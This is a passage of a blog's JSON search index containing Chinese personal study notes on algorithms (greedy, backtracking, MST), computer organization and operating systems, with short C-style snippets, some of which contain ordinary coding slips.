f[],bool A[]){ A[1]=true;//活动1 int j=1;//记录最近一次加入A[]的活动 for(int i=2;i\u0026lt;=n;i++){ if(s[i]\u0026gt;=f[j]){//找到一个相容活动，开始时间大于上一个结束时间 A[i]=true; j=i; }else{A[i]=false;} } } 最终结果A[]中true记录要加入的活动\n最优装载问题 将尽可能多的集装箱装上轮船\n分解：重量由小到大排序\n解决：选择称重量较轻的装载。装载条件：轮船甚于重量\u0026gt;其中一个集装箱重量\n合并：将选择装入轮船集装箱的号码列出\n1 2 3 4 5 6 7 8 9 10 //假设集装箱已经按重量递增的次序排序 void Loading(int x[],Type w[],Type c,int n){ for(int i=1;i\u0026lt;=n;i++){ x[i]=0;//初始化为0 for(int i=1;i\u0026lt;=n\u0026amp;\u0026amp;w[i]\u0026lt;=c;i++){ x[i]=1; c-=w[i]; } } } 哈夫曼编码 构造哈夫曼树\n为什么会出现重码现象？ 编码位数不确定。通过以哈夫曼树为基础的哈夫曼编码完成需求，左树为0，右树为1.\n时间复杂度：对字符出现频率排序，默认使用堆排序，O(nlogn)，构建哈夫曼树，O(n^2)，遍历字符集，注意给每个字符复制编码，时间O(n)。总时间消耗(n^2)\n生成最小生成树——Prim算法 每次循环选择一个合适的顶点\n时间复杂度O(n^2)，只与顶点数n有关\n有n个顶点的图的生成树有n-1条边\n最小生成树：权值之和最小的生成树\nU生成树集合，V-U未生成树集合\n在U和V-U中顶点的边选权值最小的边，将顶点加入U，直到V-U为空\n生成最小树——Kruskal算法 每次循环选择一条适合的边\n时间复杂度O(eloge) 只与边数e有关\n有条件加入边，按从小到大的顺序选取，形成回路则舍弃，直到n-1条边\n单源最短路径 Dijkstra算法：从一个顶点到其余各顶点的最短路径\n如何存放最短路径长度：dist存储\n如何存放最短路径长度：path存储\npath[j]=w，表示从源点到j的最短路径中，j的前一个顶点式w\n回溯法 通用的解题法：可以求出问题的所有解\n深度优先策略\n约束条件（constraint）：决定是否可以接受当前的部分解。\n限界条件（bound）：用于剪枝，避免搜索不可能产生解的路径。\n子集树 当所给的问题是从n个元素的集合S中找出满足某种性质的子集时\n1 2 3 4 5 6 7 void Backtrack(int t){ if(t\u0026gt;n) Output(x);//已搜索至树叶 else for(int i=0;i\u0026lt;=1;i++){ x[t]=i; if(Constraint(t)\u0026amp;\u0026amp;Bound(t)) Backtrack(t+1); } } 排列数 当所给的问题时确定n个元素的满足某种性质的排列时，相应的解空间树称为排列树\n1 2 3 4 5 6 7 8 void BackTrack(int t){ if (t\u0026gt;n) Output(x); else for(int i=t;t\u0026lt;=n;i++){ swap(x[t],x[i]); if(Constraint(t)\u0026amp;\u0026amp;Bound(t)) Backtrack(t+1); swap(x[t],x[i]); } } n后问题 任何皇后不在同行同列同斜线上\n约束条件：\nx[i]!=x[k]（不在同一列）\n|i-k|!=|x[i]-x[k]|(斜率不为1)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int n,x[N+1],sum=0; bool Place(int k){ for(int j=1;j\u0026lt;k;j++){ if(abs(k-j)==abs(x[k]-x[j])||x[j]==x[k]) return False; else return True } } void Backtrack(int t){ if(t\u0026gt;n){//已经搜索到一叶节点，得到一个互不攻击的放置方案 sum++; for(int i=1;i\u0026lt;=n;i++) cout\u0026lt;\u0026lt;x[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34; cout\u0026lt;\u0026lt;endl; } else for(int i=1;i\u0026lt;=n;i++){ x[t]=i; if(place(t)) Backtrack(t+1); } } 时间复杂度\n共有结点 $$ \\sum_{0}^{n-1} n^i $$检查当前扩展结点每一个儿子是否可以放置该列O(n^2)\n相乘，总时间耗费O(n^(n+1))\nm图着色问题 若一个图最少需要m中颜色才能使途中任何一条边连接的2个顶点有不同颜色，则称这个数m为该图的色数。求一个图色数m的问题称为图的m可着色优化问题\n用邻接矩阵表示无向连通图G=(V,E)，x[i]表示顶点i所着颜色，共有m种颜色，完全m叉树\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void BackTrace(int t){ if(t\u0026gt;n){ sum++; for(int i=1;i\u0026lt;=n;i++) cout\u0026lt;\u0026lt;x[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; cout\u0026lt;\u0026lt;endl; }else{ for(int i=1;i\u0026lt;=m;i++){ x[t]=i; if(ok(t)) Backtrace(t+1); } } } bool ok(int k){ for(int j=1;j\u0026lt;k;j++){ if(a[k][j]==1\u0026amp;\u0026amp;(x[j]=x[k]))//1代表相邻，0表示不相邻，相邻且颜色相同 {return Flase;}else{ return True; } } } 分支限界法 找出T种使得某一目标函数达到极小或极大的解\n分支限界法与回溯法的不同：\n1.回溯法一广度优先的方式搜索解空间树T；分支限界法以广度优先或最小耗费优先的方式搜素空间树T\n2.回溯法一般只通过约束条件，分支限界法不仅通过约束条件，还通过目标函数的限界减少无效搜索（在每一活结点处，计算一个函数值）\n","date":"2025-04-12T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%A6%82%E5%BF%B5/","title":"数据结构与算法概念"},{"content":"核心：计算\n五大功能部件：输入设备，运算器，存储器，控制器，输出设备。运作方式？\n存储器：外存（磁盘存储器），内存优缺点？ 容量大，断电后依然可以保存数据，无法直接从其中取数据用，必须把数据调入内存后才能使用，访问速度慢；\n访问速度快，可以hi结合运算器交换信息，一般只存储正在运行的程序和待处理的数据，但是容量小，断电后无法保存数据\n内存存储单元的访问？ 地址-\u0026gt;MAR（存储器地址寄存器，用于寻址）-\u0026gt;译码电路-\u0026gt;存储单元-\u0026gt;MDR(存储器数据寄存器，位数等于存储字长)\n冯诺依曼计算机 存储程序工作方式 将程序所含的指令和数据放入主存储器，一旦程序被启动执行，计算机会取指令和执行。（执行过程：取指，译码，计算下条指令，取操作数并执行，将结果送回寄存器）\n从源程序到可执行文件 翻译程序三类：汇编程序，解释程序如python（逐条翻译成机器指令并执行），编译程序（将高级语言翻译成汇编or机器语言）\n.c-\u0026gt;.i-\u0026gt;.s-\u0026gt;.o-\u0026gt;.out\n数制与编码\n进制转换 除基取余法，乘基取整法\n真值vs机器数 0表示正数，1表示负数\n定点数vs浮点数 计算机中只能表示0和1，机器内部没有小数点，只是人为约定了小数点，约定小数点在寄存器最右边一位数的后买你。定点数式小数点在固定位置，而浮点数不是；对于一个定点数，形式为 1为符号位加3位数值位（4位寄存器）\n引出的原码概念\n用机器数的最高位表示符号，其余各位表示数的绝对值\n补码 真值7：0111\n+1\n真值-8：1000\n第一位是-2^k,上面例子就是-2^3\n反码 符号位不变，数值为按位取反，在数轴上，正数与负数关于原点对称（毕竟本来符号位就是反的）\n但是浪费了0一种状态\n原码到补码转换 负数：符号位不变数位按位取反，末位加一，补码到原码逆向即可\n正数：都一样\n移码 x+2^n(对于n+1位机器数)，比如4位机器数\n使用移码好处，单调性与真值一致，适合比大小\n无符号数 一个编码所有二进制都用来表示数值而没有符号位时，如用无符号int进项地址运算\n思考：机器数本身是没有意义的，取决于编码方式？\n程序执行的过程\nISA指令集体系结构：抽象视图\n计算机组成（实际硬件实现）是计算机计算机体系结构（ISA）的具体实现\n寄存器：用来存放一个单位的数据的存储单位，位于CPU中，但是访问速度快于访问CPU外的存储器\n时钟：绝大多数数字电路都带有一个时钟，用以生成来内需的间隔固定的电脉冲流。用来计时确定计算机内所有时间的顺序\nRISC和CISC的区别？ RISC：精简指令集计算机，用少量的指令完成简单操作，提高了程序设计的难度，复杂操作需要哟个多个指令复合，比如ARM处理其\nCISC：复杂指令集计算机，使用大量的指令，减少了程序设计的难度，但是使CPU和控制单元电路更复杂，比如Intel奔腾系列CPU\n乱序执行的好处？ 并发，CPU使用多核，改变指令的执行顺序提高计算机的速度\n最大游程-状态图？ 判断和前一个数字是否相同，如果相同则在同一个序列中，如果不同就不再同一个序列中，默认状态不在同一个序列，遇到相同的改为同一序列，再切回默认\n存储系统\n存储器映射只是概念上的，展示了信息在存储器中的存放位置，存储器中的每个位置要么保存指令，要么保存数据元素\n处理器将一个放在地址总线上的地址以及以以一个，用于选择读操作或写操作的控制信号发送给存储器，写/读周期中，数据总线上的数据写入存储器/供CPU读取\n寄存器传输语言（RTL）：更加容易定义计算机内发生的操作\n存储程序计数器：程序计数器指向指令，CPU从程序计数器所指的存储单元中读出指令，修改程序计数器，只想下一条指令，指令解码，执行指令\n执行一条指令至少需要几次访存？ 两次，一次是读指，一次是读出数据\n指令格式 ADD,P,Q,R ;100110101110\nADD取操作数 10取操作数表中取指令，数据从内存中取值，放在加法器中\n两地址取指和单地址取指 两地址取指会破坏它的一个操作数（替换），如 mov a,b，在实际计算机中，不允许一条指令使用两个存储地址（指内存，这也说明了为什么要使用寄存器），所以规定一个是存储器地址（内存），另一个是寄存器地址；单地址指令，operation address，指令中只提供了一个操作数地址，而指令却需要至少两个地址，处理器使用一个不需要显示地址的第二操作数，第二个操作数来自CPU内一个叫累加器的寄存器，如实现P=Q+R，LOAD (accumaltor),ADD R (),STORE (accumalator) P\n一个对于计算机的分类方式，按指令处理数据的方式 存储器-存储器型（一般不用，我觉得应该是速度比较慢，寄存器访问最快），寄存器-存储器(要么被写回存储器，要么被写回寄存器)，寄存器-寄存器（LOAD,STORE）\n存储层次 寄存器（处理器的工作数据）-\u0026gt;cache（缓存常用数据的快速存储器）-\u0026gt;DRAM(动态随机访问存储器，易失性，村昂正在执行的程序的主存)-\u0026gt;硬盘，速度由快到慢，容量由小到大\nCache高速缓存，cache访问时间比主存短，因为cache保存着经常使用的数据，与CPU的地址总线和数据总线相连，优先从cache中发送数据，而不会取主存中取数据\n一级缓存，二级缓存，三级缓存\n总线的好处与缺点？（BUS） 只有一条高速数据通路，一条就可以将所有单元连接在一起；但是每次只有唯一一个设备能与其他设备通信，不得不去竞争总线的控制权，仲裁——多个设备竞争同一资源。\n宽度：并行数据通路（一次并行能传送多少数据）\n带宽：传输速率\n延迟\n多总线系统 提高性能，不然若要添加一个新单元，必须在新单元与它所连接的每个单元之间增加一条新连接\n指令集体系结构 以下基于ARM（处理器）-\u0026gt;RISC结构，相比于Intel-\u0026gt;CISC更加精简\nCPU的寄存器：1.高速暂存寄存器，用于保存地址\n2.PC，程序计数器，记录了要执行的下一条指令的地址；MAR，存储器地址寄存器，保存了读或写操作正在访问的存储单元的地址；MBR，存储器数据寄存器，保存了刚从存储器种读出的数据，或将要写入存储器的数据；IR，指令寄存器，存放最近从存储器种取出的指令，也就是当前正在执行的指令\n3种指令格式：\nLDR r1 1234 把地址为1234的存储单元中的数据读到寄存器r1中\nSTR r2 2000 把寄存器r2的值写入地址为2000的存储单元\nOperation :ADD r1,r2,r3\n如何读取并执行LDR r1,1234 FETCH [MAR]\u0026lt;-[PC] ；把PC的值复制到存储器地址寄存器，表示正在访问的\n​ [PC]\u0026lt;-+=4 ;PC指向下一条指令\n​ [MBR]\u0026lt;-[[MAR]] ;读出MAR中的指令，保存到MBR中，\n​ [IR]\u0026lt;-[MBR]\nLDR [MAR]\u0026lt;-[IR(address)] ;读出IR种的操作数地址\n​ [MBR]\u0026lt;-[[MAR]] ；操作数读到MBR\n​ [r1]\u0026lt;-[MBR]\n为什么每次取指后PC必须加4 32位微处理器使用32位指令和32位字数据（比如在64位上PC就要加8？）\n扩展处理器：常量处理\nLDR r1,1234 ;这里的1234是指位234的存储单元的内容\nLDR r1,#1234 ;这里的1234是指立即操作数，立即数是一个在运算中可以直接使用的数\n扩展处理器：流控制 非顺序执行的能力，转移到特定位置的分支和跳转指令，例子：if\u0026hellip;\u0026hellip;else\u0026hellip;\u0026hellip;.\n1 2 3 4 5 SUBS r,r5,#1 BEQ onZero ;如果r5为0则跳到onZero处执行 notZero ADD r1,r2,r3 条件吗寄存器CCR 保存了ALU中用于测试的条件（如0，正，负），当ALU执行一个操作时，更新CCR的零位，借位位，负位，溢出位\n如果CCR测试位为false，则处理器从[PC]+4处取出下一条指令，CCR的测试位为true，则PC从IR的操作数字段载入新地址并跳转\nZ（结果是否为0），N（二进制形式是否为负），C（产生进位位），V（溢出）\n如何使用条件分支指令BEQ address来实现高级语言结构？ BEQ指令选出CCR中的一位进行测试（Z,N,C,V）如果被测试位1，则PC载入一个新地址，否则不变\nISA的组成 寄存器集，寻址方式，指令格式\n寄存器对于提高计算机性能和实际指令集设计是很有必要的\nOp-code+control bits+destination register+source register1+source register2\n假设某计算机操作码8位，使用3位可以访问r0-r7中一个，就能用8+3+3+3=17位实现指令ADD P=Q+R\n寻址方式：1）立即数寻址：如操作数P=Q+5，5就是立即数，它没有被保存在存储单元或寄存器中，而是指令的组成部分，ARM处理器使用前缀#指定立即从操作数\n2）直接寻址：绝对寻址，把操作数地址用作指令中的一部分，如ADD P,Q,R表示将存储单元Q的内容与存储单元R的内容相加，并保存在存储单元P中\n3）间接寻址：寄存器间接寻址，获得一个操作数需要三次访问，度至零，读含有操作数地址的寄存器，以及最后读出实际的操作数，反右操作数地址的寄存器乘坐指针寄存器，LOAD型计算机（如ARM），使用这种寻址方式访问存储器操作数\n以下是ARM,Intel 32和Freescale的汇编语言\nLDR r1,[r2]\nMOV ax,[bx]\nMOVE (A5),D2 A5-\u0026gt;D2\n为什么计算机不支持存储器-存储器型寻址方式？ 存储单位占用空间大，所需地址位数多，访问速度慢\n操作码与指令 三地址计算机\n双地址计算机\n单地址计算机\n零地址计算机：栈计算机，单操作数运算作用于栈顶，双操作数首先从栈顶取出两个元素，运算后入栈\n存储器\n分类 存取方式：RAM,ROM SAM,DAM\n断电后是否保存：易失性（RAM），非易失性（ROM,磁盘，磁带，光盘）\n读出方式：破坏性读出，非~\n性能指标 存储单元\n编址和寻址。为了区别存储体中的存储单元，必须将它们统一编号，存储单元的编号称为地址\n存取时间，存取周期（访问时间，恢复时间）\n主存储器\nDRAM的工作原理 打开开关，给电容充电，完成写入；当充满电时打开开关，电流留出，信号放大器检测1还是0，电被释放，所以是破坏性读出，需要恢复电荷，过程叫做再生\n半导体存储芯片 译码驱动电路，存储矩阵，读/写电路\n译码驱动方式 单译码法\n线选法：通过n个地址引脚定义一个大小为2^n的地址空间，缺点时译码后输出端的线数量过多，故值适用于容量小的静态存储器\n重合法：适合大容量的动态存储器\n双译码法\nDRAM行列地址复用，行缓冲，位平面\nDRAM的刷新 为什么会有刷新？\n电容会漏电，所以DRAM的单个存储单元必须市场刷新，否则会因漏电发生数据丢失\n分类：\n集中刷新 后128个读写周期集中用于刷新，读写操作期间不受刷新操作的影响，速度比较快，但是存在死去，即在集中刷新的128个读写周期内，CPU长时间不能访问存储器\n分散刷新 不存在死区，但是因为刷新过于频繁，严重影响了习用的速度，不适合应用于高速存储器\n异步刷新 集中刷新和分散刷新的结合，更加常用，避免CPU连续等待时间过久\nattention：刷新以行为单位，逐行顺序地恢复数据，再生仅恢复被读出地那个单元的数据\n","date":"2025-04-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/","title":"计算机系统层次结构"},{"content":"引导程序：当计算机开机运行时，需要运行一个初始程序，位于计算机的固件，如只读内存ROM，将操作系用内核加载到内存中，除了内核外，一些服务也会在启动时加到内存成为系统程序或后台，一旦完成，系统完全启动，等待事件发生（如触发一个软件）\n中断：事件发生通常通过硬件或软件的中断来通知，硬件可以通过系统总线发送信号到CPU，以触发中断，软件可以通过执行系统调用（systemcall）触发中断\n存储结构 内存，即随机访问内存RAM，或动态随机访问内存（不一定连续），DRAM\n只读内存，ROM，数据不可修改，不可写。\n内存有易失性\n外存：非易失性，数据可持久化\n寄存器-\u0026gt;高速缓存-\u0026gt;内存-\u0026gt;固态磁盘-\u0026gt;硬盘-\u0026gt;光盘-\u0026gt;磁盘\nI/O结构\npass\n从处理器数量分类：\n单处理器系统：执行一个通用指令集，该指令集包括执行用户进程的指令，而专用处理器执行有限的指令集\n多处理器系统：多核系统，集成多个计算机到单个芯片的系统\n内存-\u0026gt;CPU*n（寄存器，高速缓存）\n（一个芯片上）多处理器系统的特点：增加吞吐量，规模经济（对于生产商而言），增加可靠性\n非对称性处理器：一个主处理器控制系统，其他处理器或向主处理器要任务或处理预先规定的任务，成为主从关系，主处理器调度从处理器，安排任务\n对称处理器：每个处理器都参与完成操作系统的所有任务，没有主从关系\n集群系统：系统将多个CPU组合在一起，一般通过网络链接，提供高可用性的服务 操作系统的执行 多道程序能力：单个程序不能让CPU和IO设备始终忙碌，多道程序通过安排作业，使得CPU总有一个执行作业，从而提高CPU利用率。\n解释下多道程序：批处理系统下有多个作业，双击qq会先放到磁盘里面一个叫做作业池的地方，准备执行，加载程序时，将作业池拿到内存里开始运行，在内存里，这些作业叫做进程（执行中的程序），就是把硬盘中的二进制文件加载到了内存中，CPU来切换执行多个进程（因为CPU的速度非常快，但一次只能执行一条指令，有大量时间空闲，这样做可以提高CPU利用率）\n为什么先要保存到磁盘的作业池？\n内存太小不能容纳所有作业，所有作业首先保存到磁盘的作业池，\n分时系统：是多道程序设计的自然延伸，对于分时系统，CPU通过切换作业执行多个作业，由于切换频率很高，用户可以在程序运行时与其交互。分时需要确保响应时间。\n解释伪并行的本质：CPU执行每个作业一个时间片，但因为切换上下文的非常快，几乎感受不出来，以至于认为是并行\n双重模式与多重模式的执行 操作系统是中断驱动的，事件是由中断或陷阱/异常引起的，陷阱是一种软件生成的中断，或源于出错，源于用户程序的特定请求\n为确保os的正确运行，必须区分操作系统代码和用户代码的执行\n用户模式和内核模式 计算机硬件可以通过模式为来表示当前模式：内核模式0和用户模式1\n当计算机系统执行用户应用时，系统处于用户模式，当用户应用通过系统调用，请求操作系统服务时，系统必须从用户模式切换到内核模式\n解释系统调用：用户想要调用硬件，OS提供一些接口（API，对外提供服务）\n解释用户模式到内核模式的调用：用户进程执行-\u0026gt;调用系统调用（触发陷阱，陷阱模式位设置位0，执行系统调用）-\u0026gt;执行系统调用（内核模式）-\u0026gt;（返回模式位=1）-\u0026gt;从系统调用返回（用户模式），切换的过程耗时，浪费性能，尽量减少用户模式到内核模式的切换\n为什么需要系统调用？\n双重模式执行提供保护手段，以便防止操作系统和用户程序收到错误用户程序的影响，这种防护实现为，将可能引起损害的机器指令作为特权指令，并且硬件只有在内核模式下才允许执行特权指令，如果在用户模式下试图执行特权指令（直接调用硬件），那么硬件并不执行该指令，而是认为该指令非法，并将以陷阱形式通知操作系统\n定时器设置的意义？\n操作系统应该维持控制CPU，防止用户程序陷入死循环，或者不调用系统服务并且不将控制返回给操作系统，为了实现这一目标可以使用定时器，设定为指定周期后中断计算机。\n进程管理 在未被CPU执行之前，程序做不了任何事情，执行中的程序称为而进程，因为程序是被动实体，只有加载到内存中，成为进程才是主动实体\n单线程进程有一个程序计数器，指定了下一个所要执行的指令\n进程是系统的工作单元，系统由多个进程组成，其中由操作系统进程，也有用户进程，所有进程并发执行\n为什么需要内存管理？\n为了改进CPU的利用率和用户的计算机响应速度，计算机应在内存中保留多个程序，这就需要内存管理。\n操作系统负责内存管理的以下活动\n记录内存的哪部分被使用以及谁在使用 决定哪些进程会调入调出内存 根据需要分配和释放内存空间 高速缓存\n为什么需要高速缓存？高速缓存一般集成在CPU中，比起重新去内存中调用，速度更快\n高速缓存的大致原理？在去内存取数据之前，会先到高速缓存中看一下有没有数据，如果没有，去内存中取，放到高速缓存中一份，再拿到CPU中\n高速缓存的数据一致性问题？如果内存中数据改变，必须保证高速缓存中对应数据失效，否则不一致\n多级高速缓存？一级缓存最靠近CPU，最快最小\n例：整数A从磁盘到寄存器的迁移：硬盘-\u0026gt;内存-\u0026gt;高速缓存-\u0026gt;硬件寄存器\nI/O系统\nI/O子系统为操作系统本身隐藏了IO设备的特性\nIO子系统包括以下几个组件：缓冲，高速缓存的内存管理组件；USB；硬件驱动程序\n只有设备驱动程序才知道控制设备的特性\n计算环境 传统计算\n移动计算：只能手机或平板电脑的计算\n分布计算：分布式系统是物理上分开的，通过网络相连的一组计算机系统\n客户机-服务器计算\n对等计算：不区分客户机和服务器\n云计算：虚拟化技术的延伸\n虚拟化 通过虚拟化，操作系统可以在其他操作系统上运行应用程序\n无虚拟化：进程-\u0026gt;内核-\u0026gt;硬件\n虚拟化：进程-\u0026gt;内核-\u0026gt;VM-\u0026gt;虚拟机管理器-\u0026gt;硬件\n操作系统的服务 用户和其他系统程序-\u0026gt;用户界面-\u0026gt;系统调用-\u0026gt;服务-\u0026gt;操作系统-\u0026gt;硬件\n用户界面:GUI和命令解释程序，即shell，将用户输入的命令转换为机器指令，占用资源更少\n系统调用 系统调用提供操作系统服务接口，这些调用通常以高级语言编写or汇编？\n例：一个简单的复制文件的操作（获取输入文件名称，写提示到屏幕，接受输入，获取输出文件名称，写提示到屏幕，接受输入，打开输入文件，如果不存在，终止，创建输出文件，如果存在，终止，循环，读取输入文件，写到输出文件，直到读取失败，关闭输出文件，写完成消息到屏幕，正常终止）\n用户应用程序（如C++，C）使用open()调用系统调用接口，切换到内核模式，底层硬件实行\n系统调用的类型：进程控制，文件管理，设备管理，信息维护，通信和保护\n进程控制 如果一个系统调用异常或暂停当前执行的程序，会存储内存到磁盘，并生成错误信息\n锁的意义？\n多进程中，多个进程会共享数据，为了确保共享数据的完整性 ，操作系统通常提供系统调用-\u0026gt;允许一个进程锁定共享数据，这样在结束前，其他进程不能访问该数据\n例：MS-DOX\n可用内存-\u0026gt;进程-\u0026gt;命令解释程序-\u0026gt;内核\n操作系统的结构 封装子系统模块\n采用为内核技术的具体实现和好处？\n对内核进行模块化，把不必要的部件从内核中移除，将他们当作系统级和用户级的程序来实现，结果是内核较小\n微内核的主要功能是，为客户端程序和运行在用户空间中的各种服务提供通信\n优点：便于移植和拓展（部件）\n缺点：增加模式切换，增加系统功能开销\n目前操作系统采用可加载的内核模块：需要哪些就加载哪些（比如调度类，文件系统，设备和总线驱动程序）\n进程管理 现代操作系统允许加载多个程序到内存，以便并发执行，进程即执行中的程序，进程是现代分时操作系统的工作单元\n并发执行：通过在进程之间切换CPU\n当一个可执行文件被加载到内存时，这个程序就成为进程，进程时执行中的程序实体，相同一份代码可以有多个程序实体（进程）,进程是操作系统进行资源分配和调度的基本单位\n但是，进程不只是程序代码，进程还包括当前活动，PC的值和寄存器的内容\n进程状态\n就绪 运行 等待\n进程状态图\npass\n进程控制块（PCB）包含许多某个特定进程相关信息，包括新城状态，程序计数器（下一个指令地址），CPU寄存器，CPU调度信息\u0026hellip;\u0026hellip;.本质就是保存上下文信息\n进程键CPU切换\n执行-\u0026gt;中断-\u0026gt;保存状态到PCB1-\u0026gt;从PCB1重新加载状态-\u0026gt;执行-\u0026gt;中断-\u0026gt;保存转台到PCB1-\u0026gt;从PCB1更新加载状态-\u0026gt;执行\n单线程：每个进程一次只能执行一个任务\n进程调度 表示进程调度的队列图\npass\n操作系统通过调度程序来选择进程而后执行进程\n长期调度程序：如批处理系统，将进程保存到类似磁盘的大容量存储设备 短期调度程序：从内存中准备执行的进程中许纳泽进程，并分配CPU执行 中期调度程序：将进程从内存（或CPU竞争中）移除，从而降低多道程序调度，之后进程可以被重新载入内存，并从中断处继续执行，称之为交换（换出，换入） IO密集型：执行进程时，IO占用更多的时间，可能要等待IO\nCPU密集型：执行进程时，CPU计算占用更多时间\n上下文切换：\npass\n进程运行 并行与并发区别？单核上并发：CPU上下切换（策略），毕竟单CPU一个时间只能执行一个进程。并行：多核，执行多个进程\nsleep（）放弃执行，但CPU此时选择其他进程不一定切换一个不一样的\n多线程模型 用户线程\n内核线程\n多对一模型 为什么不用多对一模型？容易阻塞（一个线程阻塞影响所有）不允许运行在多处理器上\n一对一模型 支持并发，但是开销影响性能\n多对多模型 多对并发，相对于多对一模型，阻塞时允许调用另一个线程\n双层模型 线程池优点？\n进程调度 CPU是如何选择进程的？\n单处理器：\n多道程序\n当一个进程等待时，交出CPU\n进程包括CPU执行和IO等待，两者交替\nIO密集型\u0026amp;CPU密集型\n抢占调度 等待状态和就绪状态？等待状态缺少IO和CPU，就绪就只缺少CPU\n抢占型和非抢占型\n调度程序\n比较CPU调度算法准则：CPU使用率，吞吐量，周转时间，等待时间，响应时间\n最大化CPU使用率和吞吐量，最小化周转时间，等待时间和响应时间\n抢占式内核\n非抢占式内核\n调度算法 先到先服务FCFS\n使用队列FIFO实现，当一个进程进入队列时，它的PCB会被连接到队列尾部，当CPU空闲时，它会分配给头部的进程\n非抢占式，平均等待时间比较长\n最短作业优先调度 SJF（shortest-job-first）\n优点：平均等待时间最小，性能最好\nQA：如何知道下次CPU执行系列？\n对于批处理系统的长期调度，\u0026hellip;\n对于短期CPU调度，\u0026hellip;\n可以是抢占式或非抢占式，依据到达时间，执行时间（delta即为剩余时间）\n抢占SJF调度称为最短剩余时间优先调度\n优先级调度 每个进程都有一个优先级关联，具有最高优先级的进程会分配到CPU，先攻优先级的进程按FCFS.SJF算法优先级位下次CPU执行的倒数，CPU执行越长，优先级越小\n但并不是优先级数值越小，优先级越高！（可能是越大）\n主要问题：无穷堵塞/饥饿问题 解决方法：老化：增加在系统中等待很长时间的进程的优先级\n轮转调度 RR\n专门位分时系统设计，增加了抢占时间片切换进程，每个进程分配不超过一个时间片的CPU执行\n抢占，性能取决于时间片大小，如果时间片很大，类似于FCFS（实际进程执行小于时间片），如果时间片很小，导致频繁的上下文切换（性能消耗）\n多级队列调度 根据属性，将一个进程永久放到一个队列\n优先级高的队列先执行，可能会有饥饿问题\n多级反馈调度 允许进程在队列之间切换，阻止饥饿发生\n为什么将IO密集型放在更高优先级队列而不是CPU密集型？ 因为IO密集型比较耗时，CPU比较空闲，根据反馈调度，CPU更有时间去执行优先级较低的\n多处理器调度 之前讨论的都是单处理器\n非对称处理器：一个处理器处理所有调度决定，IO处理等系统活动，其他处理器只执行用户代码，简单，减少数据共享需要\n多对称处理器SMP：每个处理器自我调度，都有私有就绪进程队列\n处理器亲和性：试图让一个进程运行在一个处理器上\n如果进程转移到其他处理器会发生什么？ 一个处理器缓存无效，第二个重新填充\n负载平衡：尽量将所有负载平衡分配到SMP每个处理器上，两种方法：推迁移和拉迁移，两种并行实现，但会抵消处理器亲和性的好处\n实时CPU调度 软实时和硬实时系统，硬实时系统必须保证以恶搞任务再它的戒指期限之前完成\n实时操作系统与一般的操作系统相比，最大的特色就是“实时性”，如果有一个任务需要执行，实时操作系统会马上（在较短时间内）执行该任务，不会有较长的延时。这种特性保证了各个任务的及时执行。\n最小化延迟 中断延时：先完成正在执行的指令，再确定中断类型（IOor时间片没？），保存当前进程状态，采用特定的中断服务程序（ISR），上下文切换，这些总时间是中断延迟\n调度延时：从停止一个进程到启动另一个进程所需的时间量\n！尽量减少中断延迟，确保实时任务得到尽快处理\n如何减少调度延迟？ 提供抢占式内核\n调度延迟的冲突部分 优先权调度 进程周期性，定期需要CPU，具有固定的处理时间t，CPU应处理的截止期限d和周期p（比如时间片）\n为什么硬实时系统处理时间要小于截止时间而不是小于周期？系统开销（比如延时）\n硬实时：0\u0026lt;=t\u0026lt;=d\u0026lt;=p\nt执行时间就是CPU运行时间，CPU利用率就是t/p\n单调速率调度 抢占的，静态优先级\n最优，但是CPU利用率是有限的，并不总是可能完成最大化CPU资源\n最早截止期限优先调度 EDF，动态分配优先级\n比例分享调度 准入控制策略：只有客户请求的股数小于可用的股数，才能允许客户进入\n同步 解决共享数据并发访问导致数据不一致\n竞争条件\n临界区：修改公共变量，不允许多进程执行\n进入区-\u0026gt;临界区-\u0026gt;退出区-\u0026gt;剩余区\n解决方案满足性质：互斥，进步，有限等待\n两种方法：抢占式和非抢占式内核\n一个进程进入临界区需要获得锁，退出时需要释放锁\n忙等待\n自旋锁：检查锁是否释放，浪费CPU周期，优点是没有切换上下文\n信号量初值为可用资源数量\n使用资源wait()减少信号量计数\n释放资源signal()增加信号量计数\n死锁与饥饿 相互持有共享资源，无法释放\n优先级反转：所有正在访问资源的进程获得访问它的更高优先级进程的优先级，直到用完资源恢复优先级\n内存 每个进程单独内存空间\n两个寄存器：基地址，界限地址\n保护：两者相加在范围里面，防止用户修改操作系统数据结构\n特权指令，在内核模式下执行，修改这两个寄存器存储的值\n地址绑定 进程在执行时可以在磁盘和内存之间移动，在磁盘上等待形成输入队列\n编译时：绝对代码\n加载时：可重定位代码\n执行时：大多数采用，从一个内存段移动到另一个内存段\n逻辑地址：CPU生成的地址（虚拟地址）\n物理地址：\n通过MMU内存管理单元映射，基地址寄存器变为重定位寄存器，用户进程加载到内存前都要加上重定位寄存器里面的位置，用户程序不会看到真实的物理地址\n动态加载 一个程序只有在调用时才会加载，所有程序都以可重定位加载格式保存在磁盘上，提高内存空间利用率\n交换\n内存-\u0026gt;快速磁盘/备份存储\n标准交换：换入换出内存进程，上下文切换时间高\n移动系统不支持交换，用闪存，由于空间约束\n移动系统的交互：空闲内存降低到一定阙值以下时，IOS不采用交换，而是要求应用程序自愿放弃分配的内存\n连续内存分配 为什么操作系统通常在低地址？ 这取决于中断向量，一般中断向量位于低内存\n内存保护：防止进程访问不属于它的内存，否则触发陷阱寻址错误\n固定分区，每个分区只能由一个进程\n可变分区，一大块可用内存，成为孔，内存有很多大小的孔\n首次适应\n最优适应\n最差适应\n内存碎片 存储被分成了大量小孔，总和能装下但是不连续，导致浪费\n空空闲块的哪段开始分配 解决外部碎片：紧缩。需要重定位是动态的，在运行时进行，但是开销比较昂贵\n分段 允许进程的物理地址空间是非连续的\n用户试图的内存管理方案，从程序员视角\n逻辑地址：段名称和段偏移（二维，段号和偏移）\n编译的时候自动分段\n从二维地址到物理一维地址，通过段表实现，段表就是基址寄存器和界限寄存器值，通过段号映射到段表中\n段号怎么转换基地址？ 分页 